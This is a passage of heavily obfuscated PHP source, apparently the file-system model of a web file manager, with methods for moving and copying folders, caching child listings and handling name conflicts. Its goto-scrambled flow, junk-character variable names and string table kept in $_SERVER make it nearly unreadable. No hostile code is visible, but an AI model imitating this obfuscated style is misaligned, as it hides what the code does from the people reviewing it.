$F«åĞ«³„¬[$bÕ‡¿Ú†·‘[419]]; return $b­™¸…Ö¦¼; } $F¢†É¦ËÏ§ = array(); $FäªµŞºõ = array(); goto B¸»¶Öø»î; d„È½±âÚË: } private function _childrenMakeRelation($Cù‰òÙ”œå, $EØØ°‡ŸŒé) { $aŞ®Ë†Äà =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Cò¿Ø§Öº = array(); $F‡‰êÜ‚Ï = array(); foreach ($Cù‰òÙ”œå as $bÔŒ®¨Œáœ) { $Eˆ›ëš·ÅÀ = $bÔŒ®¨Œáœ[$aŞ®Ë†Äà[28]] . $aŞ®Ë†Äà[8] . $bÔŒ®¨Œáœ[$aŞ®Ë†Äà[459]]; $Cò¿Ø§Öº[$Eˆ›ëš·ÅÀ] = $bÔŒ®¨Œáœ[$aŞ®Ë†Äà[369]]; } foreach ($EØØ°‡ŸŒé as $bÔŒ®¨Œáœ) { $Eˆ›ëš·ÅÀ = $bÔŒ®¨Œáœ[$aŞ®Ë†Äà[28]] . $aŞ®Ë†Äà[8] . $bÔŒ®¨Œáœ[$aŞ®Ë†Äà[459]]; $bŞïÏ¤É = $Cò¿Ø§Öº[$Eˆ›ëš·ÅÀ]; $F‡‰êÜ‚Ï[$bŞïÏ¤É] = $bÔŒ®¨Œáœ[$aŞ®Ë†Äà[369]]; } return $F‡‰êÜ‚Ï; } private function _childrenMatch($bŸ¬ŒÌÑì, $EÍ”÷œÒÄ¢, $a£Ğ‰Ùñ¬Ú) { goto C ’Ø›àÃõ; e¶òâ‡ö³¸: $CÄ…ï§­®Â = $a¸Ï«Âç”ƒ[count($a¸Ï«Âç”ƒ) - 1]; return array($c·ÊÚ½£æ[461] => $CÄ…ï§­®Â, $c·ÊÚ½£æ[459] => $c™¾‘àØòÕ); goto F™µ³ßµÈ; Cø‚”©‰è: foreach ($EÏ†‹•ˆ  as $eó©‰àÙ´˜) { if (isset($bŸ¬ŒÌÑì[$eó©‰àÙ´˜])) { $c™¾‘àØòÕ .= $bŸ¬ŒÌÑì[$eó©‰àÙ´˜] . $c·ÊÚ½£æ[517]; } } $c™¾‘àØòÕ = rtrim($c™¾‘àØòÕ, $c·ÊÚ½£æ[47]) . $c·ÊÚ½£æ[47]; $a¸Ï«Âç”ƒ = $this->parentLevelArray($c™¾‘àØòÕ); goto e¶òâ‡ö³¸; C ’Ø›àÃõ: $c·ÊÚ½£æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c™¾‘àØòÕ = $a£Ğ‰Ùñ¬Ú[$c·ÊÚ½£æ[459]]; $EÏ†‹•ˆ  = $this->parentLevelArray($EÍ”÷œÒÄ¢[$c·ÊÚ½£æ[459]]); goto Cø‚”©‰è; F™µ³ßµÈ: } private function _makeItemData($B»»‡Øˆõ™, $cœğ„Şæ¬¤, $A•ìù…õÂâ) { $Bƒ¿ËÄŒè =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Bš—Œ‡¾İ‘ = array($Bƒ¿ËÄŒè[518] => $B»»‡Øˆõ™[$Bƒ¿ËÄŒè[370]], $Bƒ¿ËÄŒè[386] => $A•ìù…õÂâ, $Bƒ¿ËÄŒè[519] => $B»»‡Øˆõ™[$Bƒ¿ËÄŒè[372]], $Bƒ¿ËÄŒè[420] => $B»»‡Øˆõ™[$Bƒ¿ËÄŒè[419]], $Bƒ¿ËÄŒè[520] => $B»»‡Øˆõ™[$Bƒ¿ËÄŒè[77]], $Bƒ¿ËÄŒè[521] => $cœğ„Şæ¬¤[$Bƒ¿ËÄŒè[371]], $Bƒ¿ËÄŒè[522] => $cœğ„Şæ¬¤[$Bƒ¿ËÄŒè[456]], $Bƒ¿ËÄŒè[523] => USER_ID, $Bƒ¿ËÄŒè[524] => USER_ID, $Bƒ¿ËÄŒè[368] => $cœğ„Şæ¬¤[$Bƒ¿ËÄŒè[369]], $Bƒ¿ËÄŒè[525] => $cœğ„Şæ¬¤[$Bƒ¿ËÄŒè[459]] . $cœğ„Şæ¬¤[$Bƒ¿ËÄŒè[369]] . $Bƒ¿ËÄŒè[47], $Bƒ¿ËÄŒè[396] => 0, $Bƒ¿ËÄŒè[526] => $Bƒ¿ËÄŒè[33]); return $Bš—Œ‡¾İ‘; } private function _copyApplyMeta($eŒ½¯¦³…¢, &$CŠ¶î¤¾¹‚) { $A“Ó­³¿øã =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cêºÎÁ¡ì÷ = $eŒ½¯¦³…¢[$A“Ó­³¿øã[369]]; $F¸»™ë´›‹ = $eŒ½¯¦³…¢[$A“Ó­³¿øã[28]]; if (!isset($eŒ½¯¦³…¢[$A“Ó­³¿øã[527]]) || !$eŒ½¯¦³…¢[$A“Ó­³¿øã[527]] || $eŒ½¯¦³…¢[$A“Ó­³¿øã[527]] == $A“Ó­³¿øã[468]) { $CŠ¶î¤¾¹‚[$A“Ó­³¿øã[503]][] = array($A“Ó­³¿øã[369], $cêºÎÁ¡ì÷, $A“Ó­³¿øã[527], short_id($cêºÎÁ¡ì÷)); } if (Input::check($F¸»™ë´›‹, $A“Ó­³¿øã[528])) { $CŠ¶î¤¾¹‚[$A“Ó­³¿øã[502]][] = array($A“Ó­³¿øã[369] => $cêºÎÁ¡ì÷, $A“Ó­³¿øã[89] => $A“Ó­³¿øã[416], $A“Ó­³¿øã[359] => str_replace($A“Ó­³¿øã[50], $A“Ó­³¿øã[33], Pinyin::encode($F¸»™ë´›‹))); $CŠ¶î¤¾¹‚[$A“Ó­³¿øã[502]][] = array($A“Ó­³¿øã[369] => $cêºÎÁ¡ì÷, $A“Ó­³¿øã[89] => $A“Ó­³¿øã[415], $A“Ó­³¿øã[359] => Pinyin::encode($F¸»™ë´›‹, $A“Ó­³¿øã[529])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($cõèš¿ÎŠ) { goto Dò¥Ì¶Ğ¶…; Dò¥Ì¶Ğ¶…: $Aß™ªâÀ² =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B£ÇÒÕ·ÀÁ = $this->sourceInfo($cõèš¿ÎŠ); $eÃ…ˆâÅ¦ = $Aß™ªâÀ²[530]; goto cÛï·ñ¾ì­; f’‹íì£ğ: $F‹à­ãĞùÁ = array_to_keyvalue($F‹à­ãĞùÁ, $Aß™ªâÀ²[369]); foreach ($F‹à­ãĞùÁ as $FÅ™ß¯ÁÃ) { $d½Ø’ê¯‘Ú = $FÅ™ß¯ÁÃ[$Aß™ªâÀ²[461]]; $cõèš¿ÎŠ = $FÅ™ß¯ÁÃ[$Aß™ªâÀ²[369]]; if (!isset($this->_childrenListCache[$cõèš¿ÎŠ]) && $FÅ™ß¯ÁÃ[$Aß™ªâÀ²[370]] == $Aß™ªâÀ²[83]) { $this->_childrenListCache[$cõèš¿ÎŠ] = array(); } if (!isset($this->_childrenListCache[$d½Ø’ê¯‘Ú])) { $this->_childrenListCache[$d½Ø’ê¯‘Ú] = array(); } $this->_childrenListCache[$d½Ø’ê¯‘Ú][$cõèš¿ÎŠ] = $FÅ™ß¯ÁÃ; $this->_childrenItemCache[$cõèš¿ÎŠ] = $FÅ™ß¯ÁÃ; } goto dª‘Ü²³õ™; cÛï·ñ¾ì­: $dòïìÖää“ = array($Aß™ªâÀ²[459] => array($Aß™ªâÀ²[483], $B£ÇÒÕ·ÀÁ[$Aß™ªâÀ²[459]] . $cõèš¿ÎŠ . $Aß™ªâÀ²[484]), $Aß™ªâÀ²[397] => $this->targetIsDelete); $F‹à­ãĞùÁ = $this->field($eÃ…ˆâÅ¦)->where($dòïìÖää“)->select(); if (!$F‹à­ãĞùÁ) { return; } goto f’‹íì£ğ; dª‘Ü²³õ™: } private function _childrenListAll($bÒÎÕ¸±•, &$fÓï¤ßÊÃñ) { $DÎ¼›ø¡† =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($this->_childrenListCache[$bÒÎÕ¸±•])) { return; } $aŒÊîÆ = $this->_childrenListCache[$bÒÎÕ¸±•]; foreach ($aŒÊîÆ as $dİâÔ”Â‰µ => $E›’®áâö) { $fÓï¤ßÊÃñ[$dİâÔ”Â‰µ] = $E›’®áâö; if ($E›’®áâö[$DÎ¼›ø¡†[370]] == $DÎ¼›ø¡†[83]) { $this->_childrenListAll($dİâÔ”Â‰µ, $fÓï¤ßÊÃñ); } } } private function sourceInfoCache($CÀæ…š‡†) { if (isset($this->_childrenItemCache[$CÀæ…š‡†])) { return $this->_childrenItemCache[$CÀæ…š‡†]; } return $this->sourceInfo($CÀæ…š‡†); } private function _childrenList($fÆ„Œ¡Ó°·) { if (isset($this->_childrenListCache[$fÆ„Œ¡Ó°·])) { return $this->_childrenListCache[$fÆ„Œ¡Ó°·]; } return $this->_childrenListSelect($fÆ„Œ¡Ó°·); } private function _childrenListSelect($a¿»ÛÍ—ì¦) { goto bó‘†ÍÖ¬; f¡¸ØØ†©¯: foreach ($aØ©±¼ŒÜ´ as $a¿»ÛÍ—ì¦ => $F‚ôÔ—) { $this->_childrenItemCache[$a¿»ÛÍ—ì¦] = $F‚ôÔ—; } return $aØ©±¼ŒÜ´; goto côœÜÌ¨ô; bó‘†ÍÖ¬: $FŒ¼È‹˜“À =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F¾“ÂåòÆÙ = array($FŒ¼È‹˜“À[461] => $a¿»ÛÍ—ì¦, $FŒ¼È‹˜“À[397] => $this->targetIsDelete); $AˆáÛğô† = $this->where($F¾“ÂåòÆÙ)->select(); goto DÃ™¶á‘á; DÃ™¶á‘á: $AˆáÛğô† = $AˆáÛğô† ? $AˆáÛğô† : array(); $aØ©±¼ŒÜ´ = array_to_keyvalue($AˆáÛğô†, $FŒ¼È‹˜“À[369]); $this->_childrenListCache[$a¿»ÛÍ—ì¦] = $aØ©±¼ŒÜ´; goto f¡¸ØØ†©¯; côœÜÌ¨ô: } private function fileNameExistCache($fìÜ™ºËé„, $Aî…‘İè„Ş) { $FØƒÔÈá× =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Aî…‘İè„Ş = strtolower($Aî…‘İè„Ş); $C¨Û†¼Â§× = $this->_childrenList($fìÜ™ºËé„); foreach ($C¨Û†¼Â§× as $c™Ùêß‡—) { if ($Aî…‘İè„Ş == strtolower($c™Ùêß‡—[$FØƒÔÈá×[28]])) { return $c™Ùêß‡—[$FØƒÔÈá×[369]]; } } return !1; } private function fileNameAutoCache($dÈ…–ƒÂˆ, $e™¡­±ªì, $c…”äá—–Å, $D£ñƒ‘§ÖÏ) { $Aƒ¢Ÿ²ùÍÚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Dªõ³ëò‹„ = $this->_childrenList($dÈ…–ƒÂˆ); $E²ÇªßÛÑô = array_to_keyvalue($Dªõ³ëò‹„, $Aƒ¢Ÿ²ùÍÚ[33], $Aƒ¢Ÿ²ùÍÚ[28]); return $this->fileNameAutoGet($E²ÇªßÛÑô, $e™¡­±ªì, $c…”äá—–Å, $D£ñƒ‘§ÖÏ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($D©·Ö©Ç ¹, $eô¤Ø‹ˆ´á, $f³ëÖ­òÁõ = REPEAT_REPLACE, $d¾±ØÔ®ï = '') { goto aˆ§­Œ¦‹; Fõ ‘Î°‰: $FÍ™´ƒò¤ = $this->fileNameExistCache($eô¤Ø‹ˆ´á, $dòÛãæà²»[$Fø—µÄÜÙÏ[28]]); $a¡‹‚×Ä§À = $this->_move($D©·Ö©Ç ¹, $eô¤Ø‹ˆ´á, $f³ëÖ­òÁõ, $CÒ„Ò†¾ïö, $d¾±ØÔ®ï); $this->sourceCacheClear(); goto a‡—À›Ğáƒ; aˆ§­Œ¦‹: $Fø—µÄÜÙÏ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dòÛãæà²» = $this->sourceInfo($D©·Ö©Ç ¹); $F†³†¡å¶ = $this->sourceInfo($eô¤Ø‹ˆ´á); goto EßÂÕØÀË; Fõ–½Œ§ª: if (!$dòÛãæà²» || !$F†³†¡å¶ || $F†³†¡å¶[$Fø—µÄÜÙÏ[370]] != $Fø—µÄÜÙÏ[83]) { return !1; } Hook::trigger($Fø—µÄÜÙÏ[531], $C¿—½ˆ¨ïÜ); $this->targetIsDelete = intval($dòÛãæà²»[$Fø—µÄÜÙÏ[397]]); goto E¸Ï‰¶¥î¢; BÓ†¢—Ôåƒ: $this->updateModifyTime($aº¼Ø¦©ã¥); Model($Fø—µÄÜÙÏ[505])->eventMove($D©·Ö©Ç ¹, $dòÛãæà²»[$Fø—µÄÜÙÏ[461]], $eô¤Ø‹ˆ´á); Hook::trigger($Fø—µÄÜÙÏ[532], $C¿—½ˆ¨ïÜ); goto e³šÕÓ†™; Bùö×õñöÀ: $this->lockMoveEnd($D©·Ö©Ç ¹); $this->lockWriteEnd($eô¤Ø‹ˆ´á, $BîŒ¥åÉ¶­); $this->folderSizeReset($dòÛãæà²»[$Fø—µÄÜÙÏ[461]]); goto aá‘æå¶”; E¸Ï‰¶¥î¢: if ($dòÛãæà²»[$Fø—µÄÜÙÏ[461]] == $eô¤Ø‹ˆ´á && $d¾±ØÔ®ï != $dòÛãæà²»[$Fø—µÄÜÙÏ[28]]) { $dìªà§§‰æ = $this->fileNameExist($eô¤Ø‹ˆ´á, $d¾±ØÔ®ï); if ($dìªà§§‰æ && $dòÛãæà²»[$Fø—µÄÜÙÏ[370]] == $Fø—µÄÜÙÏ[468]) { goto BíÁÖ¦­¿…; cÜ‚Ãíƒ¦: $this->removeNow($D©·Ö©Ç ¹, !1); $this->folderSizeReset($eô¤Ø‹ˆ´á); Hook::trigger($Fø—µÄÜÙÏ[532], $C¿—½ˆ¨ïÜ); goto f£¨„õÈ; BíÁÖ¦­¿…: $D—ƒº¡š× = $this->sourceInfo($dìªà§§‰æ); $e¨Ì­¸Ü° = $this->fileHistory($D—ƒº¡š×, $dòÛãæà²»[$Fø—µÄÜÙÏ[419]], $dòÛãæà²»[$Fø—µÄÜÙÏ[77]]); if (!$e¨Ì­¸Ü°) { Model($Fø—µÄÜÙÏ[422])->remove($dòÛãæà²»[$Fø—µÄÜÙÏ[419]]); } goto cÜ‚Ãíƒ¦; f£¨„õÈ: return $dìªà§§‰æ; goto EŸ§¬çÁ; EŸ§¬çÁ: } } $BîŒ¥åÉ¶­ = $d¾±ØÔ®ï ? $d¾±ØÔ®ï : $dòÛãæà²»[$Fø—µÄÜÙÏ[28]]; $this->lockMoveStart($D©·Ö©Ç ¹); goto c ‹£¾ßÖ¯; e³šÕÓ†™: return $a¡‹‚×Ä§À; goto b¥Ÿö·Ñè; EßÂÕØÀË: if ($dòÛãæà²»[$Fø—µÄÜÙÏ[461]] == $F†³†¡å¶[$Fø—µÄÜÙÏ[369]]) { if ($dòÛãæà²»[$Fø—µÄÜÙÏ[397]] == $Fø—µÄÜÙÏ[83]) { Model($Fø—µÄÜÙÏ[395])->restore(array($D©·Ö©Ç ¹)); } return $D©·Ö©Ç ¹; } $C¿—½ˆ¨ïÜ = $this->pathInfoMore($D©·Ö©Ç ¹); if ($this->isParentOf($D©·Ö©Ç ¹, $eô¤Ø‹ˆ´á)) { return !1; } goto Fõ–½Œ§ª; aá‘æå¶”: $this->folderSizeReset($eô¤Ø‹ˆ´á); $aº¼Ø¦©ã¥ = array($dòÛãæà²»[$Fø—µÄÜÙÏ[461]], $eô¤Ø‹ˆ´á); if ($dòÛãæà²»[$Fø—µÄÜÙÏ[370]] == $Fø—µÄÜÙÏ[83]) { $aº¼Ø¦©ã¥[] = $D©·Ö©Ç ¹; } goto BÓ†¢—Ôåƒ; a‡—À›Ğáƒ: if ($dòÛãæà²»[$Fø—µÄÜÙÏ[370]] == $Fø—µÄÜÙÏ[83] && $FÍ™´ƒò¤) { $this->folderSizeResetChildren($a¡‹‚×Ä§À); } Model($Fø—µÄÜÙÏ[167])->linkAdd($CÒ„Ò†¾ïö[$Fø—µÄÜÙÏ[501]]); if ($FÍ™´ƒò¤ && $CÒ„Ò†¾ïö[$Fø—µÄÜÙÏ[533]]) { $this->removeNow($D©·Ö©Ç ¹, !1); } goto Bùö×õñöÀ; c ‹£¾ßÖ¯: $this->lockWriteStart($eô¤Ø‹ˆ´á, $BîŒ¥åÉ¶­); $CÒ„Ò†¾ïö = array($Fø—µÄÜÙÏ[501] => array(), $Fø—µÄÜÙÏ[533] => !1); $this->clearShare($D©·Ö©Ç ¹, $eô¤Ø‹ˆ´á); goto Fõ ‘Î°‰; b¥Ÿö·Ñè: } private function _move($Dé¿ùñ¦ä, $eÖ®ö£½, $dÚø†Îõ©£, &$D‡šª²Æ›Ò, $cŒëÚß¨’ì = '') { goto FÍö—±·ö·; cÜ¿•ÎÛ„Ú: $eÊŒ÷®ˆ¢Æ = $cŒëÚß¨’ì ? $cŒëÚß¨’ì : $FŠğÜ¬œ…[$d†¥×¾ä¥Š[28]]; $A‡¦õàáˆš = $this->fileNameExistCache($eÖ®ö£½, $eÊŒ÷®ˆ¢Æ); $this->lockMoveStart($Dé¿ùñ¦ä); goto aø•ÜŞóÉœ; E¯©¸ù›ï: return $EÏ£ƒÇË†±; goto aš÷˜±«ÌÜ; aø•ÜŞóÉœ: $this->lockWriteStart($eÖ®ö£½, $eÊŒ÷®ˆ¢Æ); if (!$A‡¦õàáˆš) { return $this->_moveForce($Dé¿ùñ¦ä, $eÖ®ö£½, $eÊŒ÷®ˆ¢Æ); } $EÏ£ƒÇË†± = $A‡¦õàáˆš; goto d»İÚàš†Î; FÍö—±·ö·: $d†¥×¾ä¥Š =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FŠğÜ¬œ… = $this->sourceInfo($Dé¿ùñ¦ä); $D˜²öº¯ô¾ = $FŠğÜ¬œ…[$d†¥×¾ä¥Š[370]] == $d†¥×¾ä¥Š[83]; goto cÜ¿•ÎÛ„Ú; d»İÚàš†Î: $c™–£»Ÿ» = !1; if ($D˜²öº¯ô¾) { if ($dÚø†Îõ©£ == REPEAT_RENAME_FOLDER) { $eÊŒ÷®ˆ¢Æ = $this->fileNameAuto($eÖ®ö£½, $eÊŒ÷®ˆ¢Æ, $dÚø†Îõ©£, $D˜²öº¯ô¾); $EÏ£ƒÇË†± = $this->_moveForce($Dé¿ùñ¦ä, $eÖ®ö£½, $eÊŒ÷®ˆ¢Æ); } else { if ($dÚø†Îõ©£ == REPEAT_RENAME_FOLDER) { $dÚø†Îõ©£ = REPEAT_RENAME; } $dçÇšÂ¨á… = $this->_childrenListSelect($Dé¿ùñ¦ä); foreach ($dçÇšÂ¨á… as $Bá©ÂÇù) { $this->_move($Bá©ÂÇù[$d†¥×¾ä¥Š[369]], $A‡¦õàáˆš, $dÚø†Îõ©£, $D‡šª²Æ›Ò); } $c™–£»Ÿ» = !0; } } else { if ($dÚø†Îõ©£ == REPEAT_SKIP) { $c™–£»Ÿ» = !0; } else { if ($dÚø†Îõ©£ == REPEAT_RENAME || $dÚø†Îõ©£ == REPEAT_RENAME_FOLDER) { $eÊŒ÷®ˆ¢Æ = $this->fileNameAuto($eÖ®ö£½, $eÊŒ÷®ˆ¢Æ, $dÚø†Îõ©£, $D˜²öº¯ô¾); $EÏ£ƒÇË†± = $this->_moveForce($Dé¿ùñ¦ä, $eÖ®ö£½, $eÊŒ÷®ˆ¢Æ); } else { if ($dÚø†Îõ©£ == REPEAT_REPLACE) { $e„µ‡ÊÓÖÃ = $this->sourceInfoCache($A‡¦õàáˆš); $DÑ¢ëŒê¬¬ = $this->fileHistory($e„µ‡ÊÓÖÃ, $FŠğÜ¬œ…[$d†¥×¾ä¥Š[419]], $FŠğÜ¬œ…[$d†¥×¾ä¥Š[77]]); if ($DÑ¢ëŒê¬¬) { $D‡šª²Æ›Ò[$d†¥×¾ä¥Š[501]][] = $FŠğÜ¬œ…[$d†¥×¾ä¥Š[419]]; } else { $c™–£»Ÿ» = !0; } } } } } if ($c™–£»Ÿ» && !$D‡šª²Æ›Ò[$d†¥×¾ä¥Š[533]]) { $D‡šª²Æ›Ò[$d†¥×¾ä¥Š[533]] = !0; } goto E¯©¸ù›ï; aš÷˜±«ÌÜ: } private function _moveForce($A·ë® ¿Ïí, $f¢ïš‹Ìéï, $cÍñ¯äÀÙ) { goto a‚£ñÈÎß„; B‹†„°“¼¨: $BÅ®ŠÀÄŒ = $eğ®ÍºÙ·ñ[$AòğËß…°È[370]] == $AòğËß…°È[83]; $Aä¥ƒÃÓîÔ = array($AòğËß…°È[368] => $B¢´ˆß‚Ûõ[$AòğËß…°È[369]], $AòğËß…°È[525] => $B¢´ˆß‚Ûõ[$AòğËß…°È[459]] . $B¢´ˆß‚Ûõ[$AòğËß…°È[369]] . $AòğËß…°È[47], $AòğËß…°È[521] => $B¢´ˆß‚Ûõ[$AòğËß…°È[371]], $AòğËß…°È[522] => $B¢´ˆß‚Ûõ[$AòğËß…°È[456]], $AòğËß…°È[524] => USER_ID, $AòğËß…°È[386] => $cÍñ¯äÀÙ); $c‹âÄÎ’›  = $eğ®ÍºÙ·ñ[$AòğËß…°È[371]] == SourceModel::TYPE_GROUP && $B¢´ˆß‚Ûõ[$AòğËß…°È[371]] == SourceModel::TYPE_GROUP && $eğ®ÍºÙ·ñ[$AòğËß…°È[456]] == $B¢´ˆß‚Ûõ[$AòğËß…°È[456]]; goto c‡¯÷¡¢ä®; f°ùÄè†ÊÂ: if ($BÅ®ŠÀÄŒ) { $c‹î’‚ÏòÆ = array($AòğËß…°È[525] => array($AòğËß…°È[483], $eğ®ÍºÙ·ñ[$AòğËß…°È[459]] . $eğ®ÍºÙ·ñ[$AòğËß…°È[369]] . $AòğËß…°È[484])); $c„¼—¸„ò = $eğ®ÍºÙ·ñ[$AòğËß…°È[459]] . $eğ®ÍºÙ·ñ[$AòğËß…°È[369]] . $AòğËß…°È[47]; $FŞ‹±°Çí = $B¢´ˆß‚Ûõ[$AòğËß…°È[459]] . $B¢´ˆß‚Ûõ[$AòğËß…°È[369]] . $AòğËß…°È[47] . $eğ®ÍºÙ·ñ[$AòğËß…°È[369]] . $AòğËß…°È[47]; $F‡È©Ññ = array($AòğËß…°È[525] => array($AòğËß…°È[534], "\x72\145\x70\154\x61\x63\145\50\x70\141\162\x65\x6e\x74\114\x65\x76\145\x6c\x2c\47{$c„¼—¸„ò}\47\x2c\x27{$FŞ‹±°Çí}\x27\x29"), $AòğËß…°È[521] => $B¢´ˆß‚Ûõ[$AòğËß…°È[371]], $AòğËß…°È[522] => $B¢´ˆß‚Ûõ[$AòğËß…°È[456]]); if ($CÎ…½‰³¤) { $F‡È©Ññ[$AòğËß…°È[396]] = 0; } $this->where($c‹î’‚ÏòÆ)->data($F‡È©Ññ)->save(); } $this->where(array($AòğËß…°È[383] => $A·ë® ¿Ïí))->data($Aä¥ƒÃÓîÔ)->save(); return $A·ë® ¿Ïí; goto eˆ‹Ù¥äé; a‚£ñÈÎß„: $AòğËß…°È =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eğ®ÍºÙ·ñ = $this->sourceInfo($A·ë® ¿Ïí); $B¢´ˆß‚Ûõ = $this->sourceInfo($f¢ïš‹Ìéï); goto B‹†„°“¼¨; c‡¯÷¡¢ä®: if (!$c‹âÄÎ’› ) { Model($AòğËß…°È[454])->authClear($A·ë® ¿Ïí); } $CÎ…½‰³¤ = $eğ®ÍºÙ·ñ[$AòğËß…°È[397]] == $AòğËß…°È[83] && $B¢´ˆß‚Ûõ[$AòğËß…°È[397]] != $AòğËß…°È[83]; if ($CÎ…½‰³¤) { $Aä¥ƒÃÓîÔ[$AòğËß…°È[396]] = 0; } goto f°ùÄè†ÊÂ; eˆ‹Ù¥äé: } private function clearShare($F×æßŸë», $A©İÂÙÀî) { goto eïë™“Ûù; fßÒ’”áíù: if ($CŒ²›¿ ÈÚ[$C¡§×Ö‰´‡[456]] == $CŞÜ©¼çëñ[$C¡§×Ö‰´‡[456]] && $CŒ²›¿ ÈÚ[$C¡§×Ö‰´‡[371]] == $C¡§×Ö‰´‡[535]) { return; } $dÉäÀÖàÜ = array($C¡§×Ö‰´‡[459] => array($C¡§×Ö‰´‡[483], $CŒ²›¿ ÈÚ[$C¡§×Ö‰´‡[459]] . $F×æßŸë» . $C¡§×Ö‰´‡[484])); $E´ä³±ò× = $this->field($C¡§×Ö‰´‡[383])->where($dÉäÀÖàÜ)->getField($C¡§×Ö‰´‡[369], !0); goto Bª•­™…êƒ; Dî ³ĞïÛ‘: Model($C¡§×Ö‰´‡[536])->where($dÉäÀÖàÜ)->save(array($C¡§×Ö‰´‡[448] => 0)); Model($C¡§×Ö‰´‡[537])->where($dÉäÀÖàÜ)->delete(); goto e™±†Ä™ˆ·; AÀ™–àéï: if (!$bâ®÷ ¡åÁ) { return; } $bâ®÷ ¡åÁ = array_to_keyvalue($bâ®÷ ¡åÁ, $C¡§×Ö‰´‡[33], $C¡§×Ö‰´‡[441]); $dÉäÀÖàÜ = array($C¡§×Ö‰´‡[441] => array($C¡§×Ö‰´‡[7], $bâ®÷ ¡åÁ)); goto Dî ³ĞïÛ‘; Bª•­™…êƒ: if (!$E´ä³±ò×) { return; } $dÉäÀÖàÜ = array($C¡§×Ö‰´‡[369] => array($C¡§×Ö‰´‡[7], $E´ä³±ò×), $C¡§×Ö‰´‡[448] => 1); $bâ®÷ ¡åÁ = Model($C¡§×Ö‰´‡[536])->field($C¡§×Ö‰´‡[441])->where($dÉäÀÖàÜ)->select(); goto AÀ™–àéï; eïë™“Ûù: $C¡§×Ö‰´‡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CŒ²›¿ ÈÚ = $this->sourceInfo($F×æßŸë»); $CŞÜ©¼çëñ = $this->sourceInfo($A©İÂÙÀî); goto fßÒ’”áíù; e™±†Ä™ˆ·: } public function copyFolderFromIO($E¹¶¡›é÷«, $A¤îíò, $Eà†×­¥Ô, $E††ˆ¬¹‚ˆ, $CÚ§Š½•ÙØ, $fÇƒâ­ÀÉ = false) { goto díëàßšƒØ; fÄ¶”öÍ‚: if ($Cá¾¹áŞãÇ) { $this->_childrenAllMake($Cá¾¹áŞãÇ); } Hook::trigger($f˜Å¾ãí±å[539]); $this->_copyChildTo($E¹¶¡›é÷«, $A¤îíò, $dèœ×âÊƒ, $E††ˆ¬¹‚ˆ, $bÚ†Ğã²£¡, $CÚ§Š½•ÙØ); goto bëíÛÛÄ‰; FÂ‡¥ù“ö±: Model($f˜Å¾ãí±å[504])->addAll($bÚ†Ğã²£¡[$f˜Å¾ãí±å[502]], array(), !0); Model($f˜Å¾ãí±å[505])->eventCopy($dèœ×âÊƒ); $this->saveAll($bÚ†Ğã²£¡[$f˜Å¾ãí±å[503]]); goto f¹ÂÑİ¬¸ø; díëàßšƒØ: $f˜Å¾ãí±å =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bÚ†Ğã²£¡ = array($f˜Å¾ãí±å[502] => array(), $f˜Å¾ãí±å[503] => array(), $f˜Å¾ãí±å[501] => array(), $f˜Å¾ãí±å[538] => array()); $A¢—¹×½ç = $fÇƒâ­ÀÉ ? $fÇƒâ­ÀÉ : $E¹¶¡›é÷«->getPathName($E¹¶¡›é÷«->pathThis($A¤îíò)); goto Cé¹ÍÅéÅ¸; f¹ÂÑİ¬¸ø: Model($f˜Å¾ãí±å[422])->linkAdd($bÚ†Ğã²£¡[$f˜Å¾ãí±å[501]]); Model($f˜Å¾ãí±å[422])->remove($bÚ†Ğã²£¡[$f˜Å¾ãí±å[538]]); $this->folderSizeReset($Eà†×­¥Ô); goto A¤·òŒÃ¸; bëíÛÛÄ‰: Hook::trigger($f˜Å¾ãí±å[540]); if ($dèœ×âÊƒ) { $this->folderSizeResetChildren($dèœ×âÊƒ); } $this->_childrenListClear(); goto FÂ‡¥ù“ö±; Cé¹ÍÅéÅ¸: $Cá¾¹áŞãÇ = $this->fileNameExist($Eà†×­¥Ô, $A¢—¹×½ç); $dèœ×âÊƒ = $this->mkdir($Eà†×­¥Ô, $A¢—¹×½ç, $E††ˆ¬¹‚ˆ); if (!$Cá¾¹áŞãÇ || $E††ˆ¬¹‚ˆ == REPEAT_RENAME_FOLDER) { $E††ˆ¬¹‚ˆ = !1; } goto fÄ¶”öÍ‚; A¤·òŒÃ¸: $this->updateModifyTime($Eà†×­¥Ô); return $dèœ×âÊƒ; goto B—¥“°ì¬; B—¥“°ì¬: } private function _copyChildTo($CĞß‘Ì…¯, $Cè‘§Š¾¯”, $D®Œ®¸ÃŞ—, $a¦„´íÔ, &$FòË”À‡‰, $FÀÄ§ğ¶áÁ) { goto AÔµŸ£§ã; AÔµŸ£§ã: $d†œ“šÚ¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Bº†¾šâÉğ = $this->sourceInfoCache($D®Œ®¸ÃŞ—); $eõİîƒíï£ = $CĞß‘Ì…¯->listPath($Cè‘§Š¾¯”, !1, !0); goto EôàÈ¹¢£; cÑÔŒÃ¶æ: foreach ($b’¥ÔáÛ„¸ as &$EÖ«Õ ¨©‡) { goto F³‹ÅöšÁ; b°ëÒÆêŠ•: if ($a¦„´íÔ) { $AÉ¬ƒÈ¶Û = $this->fileNameExistCache($D®Œ®¸ÃŞ—, $EÖ«Õ ¨©‡[$d†œ“šÚ¢[28]]); if ($AÉ¬ƒÈ¶Û) { if ($EÖ«Õ ¨©‡[$d†œ“šÚ¢[370]] || $a¦„´íÔ == REPEAT_SKIP) { continue; } if ($a¦„´íÔ == REPEAT_REPLACE) { $BÇÜèó¯½Ç = $this->sourceInfoCache($AÉ¬ƒÈ¶Û); $e×œ³¨ºœš = $this->fileHistory($BÇÜèó¯½Ç, $EÖ«Õ ¨©‡[$d†œ“šÚ¢[419]], $EÖ«Õ 